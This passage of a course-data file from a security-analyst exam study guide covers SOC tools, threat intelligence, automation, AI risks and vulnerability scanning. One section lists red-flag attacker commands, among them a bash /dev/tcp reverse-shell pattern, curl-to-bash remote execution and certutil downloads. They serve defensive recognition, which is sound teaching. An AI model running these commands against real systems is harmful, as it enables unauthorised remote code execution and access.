    title: "Tools to Determine Malicious Activity",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.3",
    moduleName: "Security Tools and Scripting",
    description:
      "CyberChef, Wireshark, Snort, Suricata, Zeek, SIEM, threat-intelligence platforms, EDR/XDR, reputation lookups, sandboxes, YARA, regex, file formats, and scripting languages.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Wrench,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Decoding and Parsing",
        explain:
          "Attackers hide commands and data by encoding them. Decoding tools turn scrambled text back into something you can read.",
        points: [
          "CyberChef: A web-based tool to decode, encode, decrypt, convert, and analyze data using 'recipes' without writing code. Common operations are From Base64, From Hex, URL Decode, and Magic (auto-detect).",
          "Encoding vs encryption: Encoding (Base64, hex) only changes format and needs no key. Encryption needs a key.",
        ],
        remember:
          "CyberChef is a translator for secret messages. Attackers hide commands in scrambled text such as Base64, and CyberChef turns it back into plain words you can read.",
        examTip:
          "A long string of random letters ending in = or ==, or a PowerShell command with -enc = Base64, decode with CyberChef (the PowerShell -enc payload is Base64 of UTF-16 text). Any question about decoding, deobfuscating, or converting data without writing code = CyberChef. Base64 is not encryption, so it gives no protection.",
      },
      {
        heading: "Packet Analysis",
        explain:
          "Packet tools let you see exactly what crossed the network. Some capture, some read, some alert, and some summarize.",
        points: [
          "Wireshark: A graphical packet capture and analysis tool. You can filter, follow a TCP stream, and inspect each protocol layer.",
          "tcpdump: A command-line packet capture tool, ideal on servers without a GUI. It can save captures to a .pcap file for Wireshark.",
          "Snort: A signature-based IDS/IPS that alerts on or blocks traffic matching rules.",
          "Suricata: An IDS/IPS that was built multi-threaded. It supports protocol detection, file extraction, and Snort-style rules.",
          "Zeek: A network monitoring platform that does not rely on signatures. It writes detailed logs of connections, DNS, HTTP, and files, which are excellent for hunting and investigation.",
        ],
        remember:
          "Think of a phone line. tcpdump = recording the calls from the command line. Wireshark = a screen where you read the transcripts. Snort and Suricata = guards who sound the alarm when they hear a known bad phrase. Zeek = a note-taker who writes a summary of every conversation.",
        examTip:
          "GUI to inspect or follow a stream = Wireshark. Quick command-line capture on a remote server = tcpdump. Rule or signature alerts, or blocking in-line = Snort or Suricata (IDS alerts, IPS blocks). Rich connection, DNS, and HTTP logs for behavior analysis and threat hunting = Zeek. Capture on a server, analyze in Wireshark is a classic workflow.",
      },
      {
        heading: "Log Analysis (SIEM)",
        explain:
          "One log line means little. A SIEM gathers logs from everywhere and connects the dots.",
        points: [
          "Security Information and Event Management (SIEM): A platform that collects, normalizes, correlates, and alerts on logs from many systems. Examples: Splunk, Elastic stack (ELK: Elasticsearch, Logstash, Kibana), and Graylog.",
          "Correlation rule: A rule that joins several events into one alert, such as many failed logins followed by a success from the same IP.",
          "Typical uses: Alerting, dashboards, searching during investigations, and compliance reporting.",
        ],
        remember:
          "A SIEM is a security control room with a wall of screens. Cameras (logs) from every system feed into one room, and the software connects the dots to raise the alarm.",
        examTip:
          "Key words 'correlate', 'aggregate', 'centralized', or 'alert across multiple sources' = SIEM. One failed login means nothing, but 500 failures followed by a success from the same IP is what a correlation rule catches. A SIEM only sees what is sent to it: if a source is not ingested, there is a blind spot.",
      },
      {
        heading: "Threat-Intelligence Platforms",
        explain:
          "These platforms collect and share indicators about attackers so you can detect threats others have already seen.",
        points: [
          "Open Threat Exchange (OTX): A free, community-driven platform where researchers share indicators of compromise in 'pulses'.",
          "Malware Information Sharing Platform (MISP): An open-source platform to collect, store, and share structured threat data between organizations.",
          "Open Cyber Threat Intelligence (OpenCTI): An open-source platform that organizes intelligence as a knowledge graph and links actors, malware, and campaigns.",
        ],
        remember:
          "A neighborhood-watch group chat. OTX = the public community board where anyone posts warnings. MISP = a trusted group where organizations swap detailed structured reports. OpenCTI = the wall of photos and red string that connects who is behind what.",
        examTip:
          "Crowdsourced IoCs from researchers as 'pulses' = OTX. Sharing structured threat data between organizations = MISP. Organizing, linking, and visualizing intelligence as a knowledge graph = OpenCTI. Imported indicators still need analysis and relevance checking before you block anything.",
      },
      {
        heading: "Endpoint Security",
        explain:
          "Endpoint tools watch and control individual devices, where most attacks eventually run.",
        points: [
          "Endpoint Detection and Response (EDR): Monitors endpoint behavior, detects threats, and lets you investigate and respond (isolate the host, kill a process, collect data).",
          "Extended Detection and Response (XDR): Extends EDR by correlating data from endpoints, email, network, identity, and cloud.",
          "Mobile Device Management (MDM): Enforces policy on mobile devices, including passcodes, encryption, and remote wipe.",
        ],
        remember:
          "EDR is a bodyguard on each laptop and server, watching everything and able to lock the door. XDR is the head of security who also sees email, network, and cloud so the whole picture comes together. MDM is the rulebook and remote control for company phones.",
        examTip:
          "Isolate a host, kill a process, or investigate endpoint activity = EDR. Correlate endpoint plus email plus network plus cloud into one story = XDR. Lost phone, enforce passcode, or remote wipe = MDM. A host isolated by EDR can still talk to the EDR console, which is how you keep investigating.",
      },
      {
        heading: "Domain and IP Reputation",
        explain:
          "Before trusting a domain or IP address, check who owns it, how old it is, where it is, and whether others reported it.",
        points: [
          "WHOIS: Shows registration details such as registrar, creation date, and name servers. Some data is hidden by privacy services.",
          "AbuseIPDB: A database of IP addresses reported for malicious activity, with a confidence score.",
          "Geolocation by IP Address (GEO-IP): Estimates the country or city of an IP address. It is approximate, and VPNs or proxies can hide the real location.",
        ],
        remember:
          "Checking a stranger before you trust them. WHOIS = ID check (who owns it, when was it created?). AbuseIPDB = criminal record check (has anyone reported it?). GEO-IP = address check (where is it coming from?).",
        examTip:
          "A domain registered a few days ago that mimics a brand = suspicious, check WHOIS. Need to know whether an IP has been reported for attacks = AbuseIPDB. Login from an unexpected country, or testing impossible travel = GEO-IP. GEO-IP is approximate, so it supports a finding but does not prove one.",
      },
      {
        heading: "File Analysis",
        explain:
          "You can learn a lot about a suspicious file without running it, and you can find related files by pattern.",
        points: [
          "Strings: Extracts readable text from a file, which can reveal URLs, IP addresses, commands, or file paths inside malware.",
          "VirusTotal: Checks files, URLs, domains, and hashes against many antivirus engines and other sources.",
          "Yet Another Recursive Acronym (YARA): A rule language that describes patterns (text, bytes, conditions) to identify and classify malware families.",
          "Hash lookup: Hashing a file (SHA-256) and searching for the hash is safer than uploading the file.",
        ],
        remember:
          "Strings = reading the text on the outside of a suspicious package. VirusTotal = asking 70 antivirus experts for a second opinion. YARA = a wanted poster that matches any file with the same suspicious features.",
        examTip:
          "Pull readable URLs, IPs, or commands from a binary without running it = Strings (static analysis). Check a hash or URL against many engines = VirusTotal; do not upload sensitive or confidential files because submissions can be seen by others. Write rules to match a malware family by pattern = YARA. Looking up a hash gives a quick answer without sharing the file.",
      },
      {
        heading: "Sandboxing",
        explain:
          "A sandbox lets you run an unknown file safely and watch what it does, which is called dynamic analysis.",
        points: [
          "Joe Sandbox: A commercial automated malware analysis platform that reports file, registry, process, and network behavior.",
          "Cuckoo Sandbox: An open-source automated malware analysis system that runs files in an isolated environment and records their behavior.",
          "Limitation: Some malware detects a sandbox or waits for a delay or user action, so it can stay quiet.",
        ],
        remember:
          "A sandbox is a bomb-disposal chamber. You open the suspicious package inside a sealed room, watch what it does (files, registry, network), and nothing escapes into the real world.",
        examTip:
          "Safely run an unknown file to watch its behavior = sandbox (dynamic analysis). Reading strings or hashes without running it = static analysis. Joe Sandbox is commercial and Cuckoo is open source. A clean sandbox result does not prove a file is safe, because evasive malware may hide.",
      },
      {
        heading: "Pattern Recognition",
        explain:
          "Analysts search huge logs by pattern and read attacker commands to understand intent.",
        points: [
          "Regular expressions (regex): Patterns that describe text, used to find IP addresses, emails, hashes, or error strings in large data.",
          "Interpreting suspicious commands: Recognizing commands that attackers use for execution, download, persistence, or remote shells.",
          "Red-flag commands: powershell -enc (hidden encoded script), certutil -urlcache (file download), curl or wget piped into bash (remote script run), nc or bash -i >& /dev/tcp/ (reverse shell), schtasks or crontab entries (persistence).",
        ],
        remember:
          "Regex is a super-powered Ctrl+F: instead of searching for one word, you describe a shape, like 'four groups of digits separated by dots', and it finds every IP address in the log. Command analysis is reading the attacker's handwriting.",
        examTip:
          "Extract all IPs, emails, or hashes from a big log = regex. A command that downloads and pipes straight into a shell = remote script execution. bash -i >& /dev/tcp/IP/PORT = reverse shell. certutil downloading a file = LOLBin abuse. Know the intent of each command, not only its name.",
      },
      {
        heading: "Email Analysis",
        explain:
          "Email headers and DNS records show whether a message is genuine and whether the sender is trustworthy.",
        points: [
          "MXToolbox: A diagnostic site for MX records, SPF, DKIM, DMARC, blacklist checks, and email header analysis.",
          "Header review: Read the Received lines (bottom to top is the delivery path), Return-Path, Reply-To, and the authentication results.",
        ],
        remember:
          "MXToolbox is the email detective. Paste in a domain or header and it tells you where the mail came from, whether the domain is on a blacklist, and whether it passes the safety checks.",
        examTip:
          "Verify SPF, DKIM, and DMARC, check MX records, run a blacklist lookup, or analyze a header for a spoofed sender = MXToolbox. A phishing email 'from the CEO': check the Received chain, the Reply-To mismatch, and whether the sending server is authorized for that domain.",
      },
      {
        heading: "User and Entity Behavior Analysis (UEBA)",
        explain:
          "UEBA learns what normal looks like for each user and device, then flags deviations that signature tools miss.",
        points: [
          "Open User and Entity Behavior Analytics (OpenUBA): An open-source platform that baselines behavior and detects anomalies.",
          "Typical detections: Insider threats, compromised accounts, unusual data downloads, off-hours logins, and abnormal access to resources.",
        ],
        remember:
          "A store clerk who knows every regular customer. When Sam, who always shops at 10 AM, shows up at 3 AM and asks for the safe, the clerk knows something is off. UEBA learns 'normal' and flags the change.",
        examTip:
          "Baselining normal behavior, insider threats, or a user suddenly downloading huge amounts of data at odd hours = UEBA. It catches things signatures miss because nothing is 'known bad', just unusual. Expect false positives while the baseline is still learning.",
      },
      {
        heading: "File Formats",
        explain:
          "Security data comes in a few common formats. You should recognize each at a glance.",
        points: [
          "JSON (JavaScript Object Notation): Key-value pairs in curly braces. Common for APIs, cloud logs, and tool output.",
          "XML (Extensible Markup Language): Data wrapped in angle-bracket tags. Common in configuration files and SAML.",
          "YAML (YAML Ain't Markup Language, listed by CompTIA as 'Yet Another Markup Language'): Indentation-based configuration used by Kubernetes, automation playbooks, and Sigma rules.",
          "EVTX: The native Windows Event Log file format, opened in Event Viewer.",
        ],
        remember:
          "Spot them by looks. JSON = curly braces and \"key\": \"value\". XML = <tags> that open and close. YAML = clean indentation with no braces. EVTX = the Windows event log file.",
        examTip:
          "Cloud or API log in {\"key\": \"value\"} form = JSON. Opening and closing tags = XML. Indentation-based config for Kubernetes or a Sigma rule = YAML (a wrong indent breaks it). Windows Security, System, or Application logs = EVTX. Windows event 4625 is a failed logon and 4624 is a successful logon.",
      },
      {
        heading: "Programming and Scripting Languages",
        explain:
          "Analysts automate repetitive work and read attacker scripts. Know which language fits which job.",
        points: [
          "Python: A cross-platform language for automation, log parsing, API calls, and analysis.",
          "PowerShell: The Windows command-line and scripting language for administration. Attackers also abuse it.",
          "Shell script: Bash and similar scripts to automate tasks on Linux and Unix.",
        ],
        remember:
          "Python is the all-purpose Swiss Army knife that works anywhere. PowerShell is the Windows toolbox (and a favorite of attackers). Shell or Bash is the Linux toolbox.",
        examTip:
          "Parse logs, call APIs, or automate across platforms = Python. Windows administration, or an attack using built-in tools = PowerShell. Process logs or automate on Linux = Shell or Bash. PowerShell is both an admin tool and an attacker tool, so context decides whether it is normal.",
         
      },
    ],
  },
  {
    id: "domain-1-4",
    title: "Threat Intelligence and Threat Hunting",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.4",
    moduleName: "Threat Intelligence and Hunting",
    description:
      "Threat actors, TTPs, Pyramid of Pain, MITRE ATT&CK, confidence levels, collection sources, IoCs, threat hunting, STRIDE, threat mapping, and cyber deception.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Crosshair,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Threat Actors",
        explain:
          "Knowing who attacks, and why, helps you predict what they will do and how long they will stay.",
        points: [
          "Advanced Persistent Threat (APT): A skilled, well-funded group (often nation-state) that breaks in, stays hidden for months, and quietly steals data or conducts espionage.",
          "Insider threat: An employee, contractor, or trusted person who harms the organization, either intentionally (malicious) or unintentionally (careless or tricked).",
          "Other actor types seen in scenarios: Hacktivists (ideology, defacement, leaks), organized crime (money, ransomware, fraud), and unskilled attackers or 'script kiddies' (use ready-made tools for curiosity or reputation).",
        ],
        remember:
          "An APT is a professional spy who sneaks in, hides for months, and quietly copies secrets. An insider already has the house keys, so no break-in is needed. One is patient and outside, the other is trusted and inside.",
        examTip:
          "Nation-state, long-term, stealthy, well-funded, or espionage = APT. Employee, contractor, or former staff with access = insider threat. A user who clicks a phishing link by accident is still an unintentional insider threat. Quick money and encrypted files = organized crime. Defaced website with a political message = hacktivist.",
      },
      {
        heading: "Tactics, Techniques, and Procedures (TTPs)",
        explain:
          "TTPs describe attacker behavior at three levels of detail. They are the most useful kind of intelligence because behavior is hard to change.",
        points: [
          "Tactics: The attacker's goal at a stage (for example Persistence or Exfiltration). It answers WHY.",
          "Techniques: The method used to reach the goal (for example Scheduled Task or Phishing). It answers HOW.",
          "Procedures: The exact steps, tools, and commands a specific group uses to carry out a technique. It answers WHAT EXACTLY this group does.",
          "MITRE ATT&CK: A public knowledge base of real-world attacker tactics, techniques, and sub-techniques. It is used to describe behavior, plan detections, and test defenses. The ATT&CK Navigator can color it as a heat map.",
        ],
        remember:
          "A bank robbery. Tactic = the goal (get the money). Technique = the method (go through the vault door). Procedure = the exact recipe (this crew, this drill, this time).",
        examTip:
          "Goal = tactic. Method = technique. Exact group-specific implementation = procedure. 'Map observed behavior to a common language' = MITRE ATT&CK. 'Persistence' is a tactic; 'Scheduled Task' is a technique for it. ATT&CK is not a strict sequence: attackers can skip or repeat tactics.",
      },
      {
        heading: "Pyramid of Pain, Heat Maps, and Attribution",
        explain:
          "Not all indicators are equal. Blocking some annoys the attacker a little; blocking others forces them to change how they work.",
        points: [
          "Pyramid of Pain: Ranks indicators by how hard it is for the attacker to change them, from easiest to hardest: hash values, IP addresses, domain names, network and host artifacts, tools, and TTPs.",
          "Heat map: A visual that highlights where risk or attack activity is highest. On ATT&CK it can show which techniques you detect well and which you miss.",
          "Attribution: Identifying who is behind an attack. It is difficult and uncertain, because attackers reuse tools, use proxies, and plant false flags.",
        ],
        remember:
          "Blocking a hash is like banning one robber's shoelaces: they buy new shoes in a minute. Blocking their TTPs is like banning their whole method: they must learn a new profession. The higher on the pyramid, the more it hurts.",
        examTip:
          "Order, easy to hard for the attacker to change: Hash, IP, Domain, Artifacts, Tools, TTPs. Detecting TTPs causes the most pain. Heat map of detection coverage = find gaps. Attribution should never be stated as certain. A question about the 'most effective, longest-lasting detection' = behavior/TTP based.",
      },
      {
        heading: "Confidence-Level Impacts",
        explain:
          "Intelligence is only useful if you can trust it and use it in time. Three qualities decide how much confidence to place in it.",
        points: [
          "Timeliness: The intelligence arrives quickly enough to act on before damage is done, and the indicators are still active.",
          "Relevance: The intelligence relates to your industry, technology, and environment.",
          "Accuracy: The information is correct and reliable, with few false positives.",
        ],
        remember:
          "A weather forecast. If it arrives after the storm (timeliness), is for a different city (relevance), or is often wrong (accuracy), you will not plan around it. Intel works the same way.",
        examTip:
          "Old indicators for infrastructure the attacker abandoned = timeliness problem. A report about a Linux-only threat when you run only Windows = relevance problem. Lots of false positives or unverified claims = accuracy problem. Low confidence means verify before you act, and do not auto-block on weak intel.",
      },
      {
        heading: "Collection Methods and Sources",
        explain:
          "Threat intelligence comes from public, private, and shared sources. Each has a different cost and trust level.",
        points: [
          "Open-Source Intelligence (OSINT): Information from public sources such as news, social media, WHOIS, public databases, and paste sites.",
          "Closed-source intelligence: Information from private, paid, or restricted sources, such as vendor subscriptions, dark-web monitoring, and government reports.",
          "Threat intelligence sharing: Exchanging indicators with trusted groups, such as ISACs (industry sharing groups), or through platforms like MISP and OTX.",
        ],
        remember:
          "OSINT = reading the public noticeboard. Closed-source = a paid private newsletter or secret briefing. Sharing = neighbors telling each other which houses were burgled so everyone locks up.",
        examTip:
          "Free and public (news, social media, WHOIS) = OSINT. Paid feeds or restricted reports = closed-source. Industry group exchanging indicators (an ISAC, MISP, OTX) = threat intelligence sharing. OSINT is cheap but must be verified; shared intel is only as good as its relevance to you.",
      },
      {
        heading: "Indicators of Compromise (IoC): Lifecycle",
        explain:
          "An IoC is evidence that a system may be compromised. Using IoCs well means collecting, analyzing, and then applying them.",
        points: [
          "Collection: Gathering indicators from logs, incident response, threat feeds, and sharing communities.",
          "Analysis: Checking whether indicators are really malicious and relevant, using tools such as VirusTotal and AbuseIPDB, and removing duplicates and false positives.",
          "Application and usage: Loading validated indicators into the SIEM, firewall, EDR, or DNS filters to detect, alert, or block, and to hunt for past activity.",
        ],
        remember:
          "IoCs are fingerprints at a crime scene. First collect the prints, then analyze them (do they match a known criminal?), then put the suspect on the watchlist in your SIEM, firewall, or EDR.",
        examTip:
          "Follow the order: collect, analyze, apply. Gathering hashes and IPs from logs = collection. Checking whether they are really malicious = analysis. Loading them into the SIEM or firewall = application. Skipping analysis causes false positives and can block legitimate services.",
      },
      {
        heading: "Types of IoCs",
        explain:
          "IoCs come in two broad types. One is a single clue, the other is a pattern.",
        points: [
          "Atomic: A single observable value that cannot be broken down, such as an IP address, domain, file hash, or email address.",
          "Behavioral: A pattern of activity that suggests malicious intent, such as many failed logins then a success, Word launching PowerShell, or large night-time uploads.",
        ],
        remember:
          "Atomic is one fingerprint. Behavioral is a habit: 'this person always checks the cameras, picks the lock, and leaves at 3 AM.' A fingerprint is easy to change, but a habit is hard to hide.",
        examTip:
          "A single value you can copy and paste (IP, hash, domain, email) = atomic. A sequence or pattern of actions = behavioral. Behavioral indicators are higher on the Pyramid of Pain, last longer, and are harder for the attacker to change, but they are harder to write detections for.",
      },
      {
        heading: "Threat Hunting",
        explain:
          "Hunting is a proactive search for threats that automated tools did not alert on.",
        points: [
          "Hypothesis-driven: The hunter starts with an idea, for example 'an attacker may be using scheduled tasks for persistence', and searches the data for it.",
          "Sources: Threat intelligence, ATT&CK techniques, and anomalies found through the SIEM, EDR, or UEBA.",
          "Outcome: Either a confirmed incident, a new detection rule, a closed visibility gap, or a documented 'nothing found'.",
        ],
        remember:
          "Alerts are the smoke alarm that rings when there is smoke. Hunting is the inspector walking through the building looking for wiring that could start a fire before any alarm goes off.",
        examTip:
          "Proactive search assuming a breach already happened = threat hunting. Start from a hypothesis, intelligence, or an ATT&CK technique. A successful hunt often ends by turning the finding into a new detection rule or playbook, which feeds back into efficiency (Module 1.5).",
      },
      {
        heading: "Threat Modeling (STRIDE)",
        explain:
          "STRIDE is a checklist for finding what could go wrong with a system. Each letter is a type of threat.",
        points: [
          "Spoofing: Pretending to be someone or something else (violates authentication).",
          "Tampering: Modifying data, code, or configuration without permission (violates integrity).",
          "Repudiation: Denying an action when there is no proof (violates non-repudiation).",
          "Information disclosure: Exposing data to people who should not see it (violates confidentiality).",
          "Denial of service: Making a service unavailable (violates availability).",
          "Elevation of privilege: Gaining more rights than allowed (violates authorization).",
        ],
        remember:
          "S = a fake name tag. T = changing the numbers in the ledger. R = 'it was not me' with no proof. I = a secret left on the open table. D = a crowd blocking the shop door. E = a visitor walking into the manager's office.",
        examTip:
          "Forged login or spoofed email sender = Spoofing. Altered file or database record = Tampering. User denies an action and there are no logs = Repudiation (fix with logging and digital signatures). Data leak = Information disclosure. Flooded service = DoS. Normal user becomes admin = Elevation of privilege.",
      },
      {
        heading: "Threat Mapping",
        explain:
          "Threat mapping links threats and techniques to your own assets and controls so you can see where you are exposed.",
        points: [
          "Threat mapping: Associating known threats, attack techniques (often ATT&CK), vulnerabilities, and your security controls to find coverage gaps.",
          "Result: A prioritized view of where to add detection or protection first.",
        ],
        remember:
          "A treasure map in reverse. You draw every path an attacker could take (threats and techniques), then mark where your guards stand (controls). Any path with no guard is a gap to fix.",
        examTip:
          "Linking techniques used by relevant threat actors to your assets and the controls that cover them = threat mapping. The goal is to decide which gap to close first. Pair it with a heat map to show covered and uncovered techniques.",
      },
      {
        heading: "Cyber Deception",
        explain:
          "Deception places bait where only an intruder would touch it. Any interaction is suspicious, which gives high-confidence alerts.",
        points: [
          "Honeypot: A decoy system designed to attract attackers and record what they do.",
          "Honeynet: A network of multiple honeypots simulating a realistic environment.",
          "Decoy assets: Fake files, databases, or servers placed in the environment to detect unauthorized access.",
          "Honeytoken and fake credentials: Fake accounts, passwords, API keys, or records that no legitimate user should ever use. Use triggers an alert.",
        ],
        remember:
          "Bait in a trap. A honeypot is a fake jar of honey that attracts the bear. A honeynet is a whole fake village. A honeytoken is a planted wallet with a tracker inside. No real employee should touch it, so anyone who does is an intruder.",
        examTip:
          "One decoy system = honeypot. A network of decoys = honeynet. A fake credential, file, or record that should never be used = honeytoken. Any interaction with a decoy is suspicious, so alerts have very few false positives and you can study attacker behavior safely. Isolate decoys so they cannot be used to attack real systems.",
      },
    ],
  },
  {
    id: "domain-1-5",
    title: "Efficiency and Process Improvement",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.5",
    moduleName: "Efficiency and Process Improvement",
    description:
      "Playbooks and runbooks, SOAR and automation, infrastructure as code, data enrichment, alert tuning, dashboards, APIs, webhooks, and plug-ins.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Workflow,
    estimatedTime: "65 minutes",
    sections: [
      {
        heading: "Standardize Processes",
        explain:
          "When every analyst handles incidents differently, results are inconsistent and slow. Standard documents fix that.",
        points: [
          "Team coordination: Standard procedures make sure everyone follows the same steps, speak the same language, and hand over work cleanly.",
          "Playbook: A documented, scenario-level plan for responding to a type of event (phishing, ransomware, data breach), including decisions and roles.",
          "Runbook: Detailed, step-by-step technical instructions for a specific routine task (isolate a host, block an IP, reset a password).",
        ],
        remember:
          "A sports team. The playbook is the game plan for a situation ('if we get a phishing report, here is how we respond'). The runbook is the exact instructions for one move ('how to isolate a host, click by click'). When everyone follows the same plan, nobody improvises under pressure.",
        examTip:
          "Responding to a TYPE of incident with defined steps and roles = playbook. Detailed technical steps for ONE routine task = runbook. New analysts handle the same alert differently each time = standardize with playbooks and runbooks. Playbook = what and who; runbook = exactly how.",
      },
      {
        heading: "Automation and Orchestration",
        explain:
          "Automating routine work frees analysts for decisions and cuts response time.",
        points: [
          "Automation: One tool performing a task automatically (for example auto-blocking a bad IP).",
          "Orchestration: Coordinating many tools and steps into one workflow (alert, enrich, open ticket, notify, block).",
          "Security Orchestration, Automation, and Response (SOAR): A platform that connects security tools and runs automated workflows, usually triggered by playbooks.",
          "Infrastructure as Code (IaC): Defining and deploying infrastructure from code (for example Terraform) so environments are consistent, repeatable, and reviewable. Scanners like Checkov can check IaC before deployment.",
        ],
        remember:
          "A kitchen. Automation = one machine doing one job (a dishwasher). Orchestration = the head chef coordinating all machines and cooks so the meal comes out together. SOAR = that head chef for your security tools. IaC = a written recipe, so every kitchen you open comes out identical.",
        examTip:
          "One task done automatically = automation. Many tools working together in one workflow = orchestration, usually through SOAR. Reduce analyst workload and response time = SOAR. Build identical, repeatable environments and avoid manual misconfiguration = IaC. Automate low-risk, repeatable steps and keep a human approval for high-impact actions like isolating a production server.",
      },
      {
        heading: "Data Enrichment, Alert Tuning, and Dashboards",
        explain:
          "Raw alerts lack context and create noise. Enrichment adds meaning, tuning removes noise, and dashboards show the big picture.",
        points: [
          "Data enrichment: Adding context to data, such as GEO-IP, IP reputation, asset owner, user role, or vulnerability status.",
          "Rule and alert tuning: Adjusting thresholds, adding exceptions, and refining logic to reduce false positives while still catching real attacks.",
          "Dashboard creation: Building visual summaries of alerts, trends, and metrics for analysts or management.",
        ],
        remember:
          "A bare IP address is just a number, but add 'owned by a hosting company, reported 50 times, in a country we never use' and it becomes a story (enrichment). Tuning is adjusting a smoke alarm so toast does not set it off. A dashboard is the car dashboard: speed and warning lights at a glance.",
        examTip:
          "Adding GeoIP, reputation, or asset owner to an alert = enrichment. Too many false positives or alert fatigue = tune the rule (thresholds, exceptions); do not simply turn it off. Quick visual of metrics or trends = dashboard. Over-tuning can create false negatives, so test changes.",
      },
      {
        heading: "Technology and Tool Integration",
        explain:
          "Security tools are most powerful when they talk to each other. APIs, webhooks, and plug-ins are the connectors.",
        points: [
          "APIs: Interfaces that let one tool request data from, or send commands to, another. The caller asks and the other tool answers (pull).",
          "Webhooks: Automatic notifications sent when an event happens, so the other system is pushed the data immediately (push).",
          "Plug-ins: Extensions that add features or integrations to an existing tool, such as a threat-feed connector for a SIEM.",
        ],
        remember:
          "An API is you phoning the restaurant to ask what is on the menu (you ask, they answer). A webhook is the restaurant texting you the moment your table is ready (they notify you). A plug-in is a new attachment you snap onto a tool you already own.",
        examTip:
          "Pull data or send a command on request = API. Notify automatically when an event happens (a new alert triggers a Slack message or SOAR workflow) = webhook. Add a feature or connector to an existing tool = plug-in. Pull = API, push = webhook. Protect API keys and tokens used for integrations.",
      },
    ],
  },
  {
    id: "domain-1-6",
    title: "AI in Security Operations",
    domain: "Domain 1.0",
    domainName: "Security Operations",
    module: "1.6",
    moduleName: "AI in Security Operations",
    description:
      "AI risks such as hallucinations, data exposure, model poisoning, and malicious prompts, plus governance and practical use cases for analysts.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Bot,
    estimatedTime: "60 minutes",
    sections: [
      {
        heading: "AI Risks",
        explain:
          "AI can speed analysts up, but it can also be wrong, leak data, or be manipulated. You must know the four risks the exam names.",
        points: [
          "Hallucinations: The AI produces confident but false output, such as an invented CVE, IP address, or command.",
          "Data exposure: Sensitive or proprietary data entered into an AI tool is stored, shared, or used for training outside your control.",
          "Model poisoning: An attacker corrupts the training data so the model behaves incorrectly or carries a hidden weakness.",
          "Malicious prompts: Crafted inputs (prompt injection or jailbreaks) that trick an AI into ignoring its rules, revealing data, or taking unwanted actions.",
        ],
        remember:
          "AI is a very confident new intern. Hallucination = the intern makes up an answer instead of admitting they do not know. Data exposure = the intern accidentally shares company secrets with outsiders. Model poisoning = someone slipped fake facts into the intern's textbook. Malicious prompt = a stranger sweet-talking the intern into breaking the rules.",
        examTip:
          "AI gives a confident answer with a fake source, IP, or CVE = hallucination (always verify). Analyst pastes customer data or source code into a public AI tool = data exposure. Attacker corrupts the training data = model poisoning (happens before or during training). Crafted input that tricks the AI at run time = malicious prompt. Poisoning attacks the TRAINING; malicious prompts attack the RUNNING model.",
      },
      {
        heading: "Governance",
        explain:
          "Governance is the rulebook for using AI at work, so benefits are gained without breaking laws or leaking data.",
        points: [
          "Legal or regulatory compliance: AI use must follow laws and standards on privacy and data protection (for example GDPR, HIPAA), including where data is processed and stored.",
          "AI usage policies: Written rules covering approved tools, what data may be entered, who reviews the output, and how use is logged and monitored.",
        ],
        remember:
          "Compliance = obeying the law of the land. Usage policy = your company's house rules: which AI tools are approved, what data may go in, and who checks the output.",
        examTip:
          "Staff pasting sensitive data into unapproved AI tools = the fix is an AI usage policy (approved tools, data rules, training) plus controls such as DLP. Concern about privacy laws or where data is stored = legal and regulatory compliance. Good governance answers involve policy, approval, and human review, not banning AI completely.",
      },
      {
        heading: "Use Cases",
        explain:
          "AI is best at processing large volumes and drafting. The analyst stays responsible for decisions.",
        points: [
          "Comparing artifacts: Finding similarities and differences between files, scripts, samples, or hashes.",
          "Analyzing log files: Summarizing huge logs and spotting anomalies faster than manual review.",
          "Document creation: Drafting reports, incident summaries, policies, and procedures.",
          "Incident investigation: Suggesting patterns, possible causes, and attack paths from evidence.",
          "Event correlation: Linking events from different tools into one story.",
          "Automation and orchestration: Automating repetitive steps and coordinating tools to speed response.",
        ],
        remember:
          "AI is a tireless assistant that never gets bored of reading. It can scan a million log lines, spot which files look alike, and draft the report, so the human can focus on decisions. The assistant helps; the analyst stays in charge.",
        examTip:
          "Best-fit AI tasks: reading huge volumes of logs, comparing artifacts, correlating events, drafting reports, and automating repetitive steps. The safe answer keeps a human in the loop: AI suggests, the analyst verifies. Be wary of answers where AI makes final decisions alone or handles sensitive data without controls.",
      },
    ],
  },
  // ===================== DOMAIN 2.0 VULNERABILITY MANAGEMENT (26%) =====================
  {
    id: "domain-2-1",
    title: "Vulnerability Discovery and Scanning",
    domain: "Domain 2.0",
    domainName: "Vulnerability Management",
    module: "2.1",
    moduleName: "Vulnerability Discovery",
    description:
      "Asset inventory, planning considerations, scan types (passive vs active, internal vs external, agent vs agentless, credentialed vs non-credentialed), discovery scanning, and security baseline scanning.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Crosshair,
    estimatedTime: "75 minutes",
    sections: [
      {
        heading: "Asset Inventory",
        explain:
          "Asset inventory is the foundation of vulnerability management. You cannot scan or protect what you do not know you have.",
        points: [
          "Asset inventory: A maintained list of all devices, systems, applications, cloud resources, IoT devices, and infrastructure.",
          "Timing: The inventory must exist before scanning so scans cover everything that matters.",
          "Maintenance: The inventory must be updated regularly as systems are added, changed, or retired.",
          "Shadow IT: Systems or cloud services used without IT knowledge, which are missing from the inventory and so never scanned.",
        ],
        remember:
          "A teacher taking attendance. If a student is not on the list, nobody notices when they go missing. An asset missing from the inventory never gets scanned, so its vulnerabilities stay hidden. Inventory first, scanning second.",
        examTip:
          "Scan results look incomplete, or a breach came through a server nobody knew about (shadow IT, a forgotten cloud instance, an unmanaged IoT device) = the root cause is an incomplete asset inventory. The fix is to discover and document assets, then keep the list updated. Discovery scans feed the inventory.",
      },
      {
        heading: "Planning Considerations",
        explain:
          "A scan that crashes a production system is a self-inflicted incident. Good planning protects the business.",
        points: [
          "Scheduling: Choose when scans run to reduce disruption. Critical systems may be scanned more often.",
          "Operations: Make sure scanning does not interrupt business processes. Coordinate with the operations team.",
          "Performance: Scans use CPU, memory, and bandwidth. Heavy scans can slow systems and networks.",
          "Sensitivity levels: Classify systems and data so scan settings fit the importance and fragility of each.",
          "Segmentation: Scan network zones separately, with scanners placed so they can reach each zone.",
